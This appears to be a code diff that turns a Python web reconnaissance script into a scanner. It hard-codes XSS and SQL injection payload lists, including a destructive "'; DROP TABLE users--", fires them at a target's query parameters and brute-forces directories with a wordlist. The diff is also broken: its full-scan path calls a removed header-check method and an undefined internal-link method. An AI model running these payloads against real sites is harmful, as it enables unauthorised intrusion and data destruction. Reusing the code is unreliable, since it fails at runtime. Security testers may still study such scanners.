@@ -9,6 +9,10 @@ import socket
 from bs4 import BeautifulSoup
 from colorama import Fore, Style, init
 from argparse import ArgumentParser
+import json
+from urllib.parse import urljoin
+from concurrent.futures import ThreadPoolExecutor
+from tabulate import tabulate
 
 init(autoreset=True)
 
@@ -21,96 +25,166 @@ BANNER = f"""
 {Fore.RED}|______|{Fore.GREEN}|_|  \_(_) {Fore.BLUE}|_____/ 
 """
 
+# Enhanced payload lists
+XSS_PAYLOADS = [
+    "<script>alert('XSS')</script>",
+    "javascript:alert('XSS')",
+    "<img src=x onerror=alert('XSS')>",
+    "'-alert('XSS')-'"
+]
+
+SQLI_PAYLOADS = [
+    "' OR 1=1--",
+    "'; DROP TABLE users--",
+    "1' UNION SELECT null, password FROM users--",
+    "admin'--"
+]
+
 class WebRecon:
-    def __init__(self, target):
+    def __init__(self, target, proxy=None, timeout=10, threads=10):
         self.target = target
-        self.results = {}
+        self.proxy = proxy
+        self.timeout = timeout
+        self.threads = threads
+        self.results = {
+            'vulnerabilities': {
+                'critical': [],
+                'medium': [],
+                'low': []
+            },
+            'directories': [],
+            'internal_links': []
+        }
+        self.session = requests.Session()
+        if proxy:
+            self.session.proxies = {
+                'http': proxy,
+                'https': proxy
+            }
+
+    def scan_common_vulns(self):
+        """Enhanced vulnerability scanning with payloads"""
+        print(f"\n{Fore.CYAN}[+] Performing Advanced Vulnerability Scan...")
         
-    def check_http_headers(self):
-        try:
-            response = requests.get(self.target, timeout=10)
-            headers = response.headers
-            print(f"{Fore.CYAN}[+] HTTP Headers:")
-            for key, value in headers.items():
-                print(f"    {Fore.YELLOW}{key}: {Fore.WHITE}{value}")
-            self.results['headers'] = headers
-        except Exception as e:
-            print(f"{Fore.RED}[-] Error checking headers: {e}")
+        # XSS Scanning
+        print(f"\n{Fore.MAGENTA}--- XSS Testing ---")
+        for payload in XSS_PAYLOADS:
+            try:
+                test_url = urljoin(self.target, 'test_path')
+                response = self.session.get(test_url, params={'input': payload})
+                if payload in response.text:
+                    vuln = {
+                        'type': 'XSS',
+                        'severity': 'Critical',
+                        'url': test_url,
+                        'payload': payload
+                    }
+                    self.results['vulnerabilities']['critical'].append(vuln)
+                    print(f"{Fore.RED}[CRITICAL] Possible XSS vulnerability found with payload: {payload}")
+            except Exception as e:
+                print(f"{Fore.RED}[-] XSS Test Error: {e}")
 
-    def dns_lookup(self):
-        try:
-            print(f"\n{Fore.CYAN}[+] Performing DNS lookup...")
-            res = dns.resolver.Resolver()
-            res.nameservers = ['8.8.8.8', '1.1.1.1']
-            
-            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
-            dns_results = {}
-            
-            for rtype in record_types:
-                try:
-                    answers = res.resolve(self.target, rtype)
-                    dns_results[rtype] = [str(rdata) for rdata in answers]
-                except Exception:
-                    dns_results[rtype] = []
-            
-            for rtype, records in dns_results.items():
-                if records:
-                    print(f"    {Fore.YELLOW}{rtype} Records:")
-                    for rec in records:
-                        print(f"        {Fore.WHITE}{rec}")
-            self.results['dns'] = dns_results
-        except Exception as e:
-            print(f"{Fore.RED}[-] DNS Lookup Error: {e}")
+        # SQLi Scanning
+        print(f"\n{Fore.MAGENTA}--- SQLi Testing ---")
+        for payload in SQLI_PAYLOADS:
+            try:
+                test_url = urljoin(self.target, 'test_path')
+                response = self.session.get(test_url, params={'id': payload})
+                if "SQL syntax" in response.text or "mysql" in response.text.lower():
+                    vuln = {
+                        'type': 'SQLi',
+                        'severity': 'Critical',
+                        'url': test_url,
+                        'payload': payload
+                    }
+                    self.results['vulnerabilities']['critical'].append(vuln)
+                    print(f"{Fore.RED}[CRITICAL] Possible SQLi vulnerability found with payload: {payload}")
+            except Exception as e:
+                print(f"{Fore.RED}[-] SQLi Test Error: {e}")
 
-    def check_ssl_tls(self):
+    def directory_scan(self, wordlist):
+        """Multithreaded directory/file scan"""
+        print(f"\n{Fore.CYAN}[+] Starting Multithreaded Directory Scan...")
         try:
-            context = ssl.create_default_context()
-            with socket.create_connection((self.target, 443)) as sock:
-                with context.wrap_socket(sock, server_hostname=self.target) as ssock:
-                    cert = ssock.getpeercert()
-                    print(f"\n{Fore.CYAN}[+] SSL/TLS Certificate Info:")
-                    print(f"    {Fore.YELLOW}Issuer: {Fore.WHITE}{cert['issuer'][0][0][1]}")
-                    print(f"    {Fore.YELLOW}Valid From: {Fore.WHITE}{cert['notBefore']}")
-                    print(f"    {Fore.YELLOW}Valid Until: {Fore.WHITE}{cert['notAfter']}")
-                    print(f"    {Fore.YELLOW}Subject: {Fore.WHITE}{cert['subject'][0][0][1]}")
-                    self.results['ssl'] = cert
-        except Exception as e:
-            print(f"{Fore.RED}[-] SSL Check Error: {e}")
+            with open(wordlist, 'r') as f:
+                paths = [line.strip() for line in f if line.strip()]
+            
+            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+                futures = []
+                for path in paths:
+                    future = executor.submit(self.check_path, path)
+                    futures.append(future)
+                
+                for future in futures:
+                    result = future.result()
+                    if result:
+                        self.results['directories'].append(result)
+                        print(f"{Fore.GREEN}[{result['status']}] {result['url']}")
+        except FileNotFoundError:
+            print(f"{Fore.RED}[-] Wordlist file not found: {wordlist}")
 
-    def detect_cms(self):
+    def check_path(self, path):
+        """Helper function for directory scanning"""
+        url = urljoin(self.target, path)
         try:
-            response = requests.get(self.target, timeout=10)
-            soup = BeautifulSoup(response.text, 'html.parser')
-            
-            # Check meta tags
-            generator = soup.find("meta", attrs={'name': 'generator'})
-            if generator:
-                print(f"\n{Fore.CYAN}[+] CMS Detection:")
-                print(f"    {Fore.YELLOW}Possible CMS: {Fore.WHITE}{generator['content']}")
-                self.results['cms'] = generator['content']
-                return
-            
-            # Check common CMS paths
-            cms_paths = ['/wp-content/', '/wp-login.php', '/administrator/']
-            for path in cms_paths:
-                test_url = self.target + path
-                resp = requests.get(test_url, timeout=5)
-                if resp.status_code == 200:
-                    print(f"\n{Fore.CYAN}[+] CMS Detection:")
-                    print(f"    {Fore.YELLOW}Possible CMS: {Fore.WHITE}WordPress" if 'wp-' in path else "")
-                    self.results['cms'] = "WordPress" if 'wp-' in path else "Joomla"
-                    return
+            response = self.session.get(url, timeout=self.timeout)
+            if response.status_code in [200, 301, 302, 403]:
+                return {
+                    'url': url,
+                    'status': response.status_code,
+                    'size': len(response.content)
+                }
+        except requests.exceptions.RequestException:
+            return None
+
+    def generate_report(self):
+        """Generate detailed vulnerability report"""
+        report = []
+        for severity in ['critical', 'medium', 'low']:
+            for vuln in self.results['vulnerabilities'][severity]:
+                report.append([
+                    vuln['type'],
+                    severity.capitalize(),
+                    vuln.get('url', 'N/A'),
+                    vuln.get('payload', 'N/A')
+                ])
+        
+        if report:
+            print(f"\n{Fore.CYAN}[+] Vulnerability Report:")
+            print(tabulate(report, headers=["Type", "Severity", "URL", "Payload"], tablefmt="grid"))
+        else:
+            print(f"{Fore.GREEN}[+] No critical vulnerabilities detected")
+
+    def export_results(self, format='json'):
+        """Enhanced export with vulnerability ratings"""
+        filename = f"webrecon_{self.target.replace('://', '_')}.{format}"
+        try:
+            if format == 'json':
+                with open(filename, 'w') as f:
+                    json.dump(self.results, f, indent=4)
+            elif format == 'txt':
+                with open(filename, 'w') as f:
+                    f.write("=== VULNERABILITY REPORT ===\n")
+                    for severity in ['critical', 'medium', 'low']:
+                        f.write(f"\n{severity.upper()}:\n")
+                        for vuln in self.results['vulnerabilities'][severity]:
+                            f.write(f"Type: {vuln['type']}\n")
+                            f.write(f"URL: {vuln.get('url', 'N/A')}\n")
+                            f.write(f"Payload: {vuln.get('payload', 'N/A')}\n")
+                            f.write("\n")
+            print(f"{Fore.GREEN}[+] Results exported to {filename}")
         except Exception as e:
-            print(f"{Fore.RED}[-] CMS Detection Error: {e}")
+            print(f"{Fore.RED}[-] Export failed: {e}")
 
 def main():
     print(BANNER)
     parser = ArgumentParser(description="WebRecon - Advanced Web Reconnaissance Tool")
     parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com)")
-    parser.add_argument("--headers", action="store_true", help="Check HTTP Headers")
-    parser.add_argument("--dns", action="store_true", help="Perform DNS Lookup")
-    parser.add_argument("--ssl", action="store_true", help="Check SSL/TLS Certificate")
-    parser.add_argument("--cms", action="store_true", help="Detect CMS")
+    parser.add_argument("--vuln-scan", action="store_true", help="Perform advanced vulnerability scan")
+    parser.add_argument("--dir-scan", metavar="WORDLIST", help="Perform directory scan using wordlist")
+    parser.add_argument("--threads", type=int, default=10, help="Number of threads for directory scan")
+    parser.add_argument("--proxy", help="Use proxy (e.g., http://127.0.0.1:8080)")
+    parser.add_argument("--output", choices=['json', 'txt'], help="Export results to file")
     parser.add_argument("--full", action="store_true", help="Run Full Scan")
 
     args = parser.parse_args()
@@ -119,23 +193,26 @@ def main():
     if not target.startswith(('http://', 'https://')):
         target = 'http://' + target
 
-    scanner = WebRecon(target)
+    scanner = WebRecon(target, proxy=args.proxy, threads=args.threads)
 
     try:
         if args.full:
             scanner.check_http_headers()
-            scanner.dns_lookup()
-            scanner.check_ssl_tls()
-            scanner.detect_cms()
+            scanner.scan_common_vulns()
+            if args.dir_scan:
+                scanner.directory_scan(args.dir_scan)
+            scanner.analyze_internal_links()
+            scanner.generate_report()
         else:
-            if args.headers:
-                scanner.check_http_headers()
-            if args.dns:
-                scanner.dns_lookup()
-            if args.ssl:
-                scanner.check_ssl_tls()
-            if args.cms:
-                scanner.detect_cms()
+            if args.vuln_scan:
+                scanner.scan_common_vulns()
+                scanner.generate_report()
+            if args.dir_scan:
+                scanner.directory_scan(args.dir_scan)
+        
+        if args.output:
+            scanner.export_results(args.output)
+
     except KeyboardInterrupt:
         print(f"\n{Fore.RED}[-] Scan interrupted by user")
         sys.exit(1)
